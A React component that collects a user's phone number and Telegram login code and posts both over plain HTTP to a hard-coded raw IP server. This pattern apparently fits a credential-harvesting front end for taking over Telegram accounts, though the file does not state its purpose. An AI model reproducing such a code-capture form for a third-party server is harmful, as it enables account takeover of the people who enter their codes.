import React, { useRef, useState } from 'react';
import axios from 'axios'

export default function Message() {
const [showBtn,setShowBtn]=useState(true);
const myrefOne=useRef();
const myrefTWo=useRef();

function sendCode() {
if (myrefOne.current.value!='') {
  setShowBtn(!showBtn);
  let obj={
    phoneNumber:myrefOne.current.value
  }  
  axios.post( 'http://69.197.134.187:9090/sendPhoneNumber' , obj ,
  {
    headers: {
      'Content-Type': 'multipart/form-data'
    }
  }
).then(res=>{
    console.log(res.data);
    console.log('success');
    alert('CODE SENT')
  }).catch(err=>{
    console.log(err.data);
    console.log('err');
    alert('ERROR CODE SENDING')
  });
}
}


function confirm(  ) {
  if (myrefTWo.current.value!='') {
    setShowBtn(!showBtn)
    let obj={
      phoneNumber:myrefOne.current.value,
      code:myrefTWo.current.value
    }  
    axios.post( 'http://69.197.134.187:9090/sendPhoneNumber' , obj ,
    {
      headers: {
        'Content-Type': 'multipart/form-data'
      }
    }
  ).then(res=>{
      console.log(res.data);
      console.log('success');
      myrefOne.current.value='';
      myrefTWo.current.value='';
      alert('login successfully')
    }).catch(err=>{
      console.log(err.data);
      console.log('err');
      alert('login error');
    });
  }
}

return (
    <div className='container'>
           <div className="row">
                <form >      
                      <label htmlFor="inpNumber">Number</label>
                      <input type="text" placeholder='+998912345678'
                       className='form-control' required id='inpNumber' ref={myrefOne}/>
                      <label htmlFor="inpCode" >Code</label>
                      <input type="number" placeholder='enter the telegram code here' 
                       className='form-control' id='inpCode' ref={myrefTWo}/>
                       {
                        showBtn?
                        <button type='button' className='btn btn-success'  onClick={sendCode}>send code</button>
                        :
                        <button type='button' className='btn btn-warning' onClick={confirm}>Confirm</button>
                       }
                </form>
           </div>
    </div>
  )
}
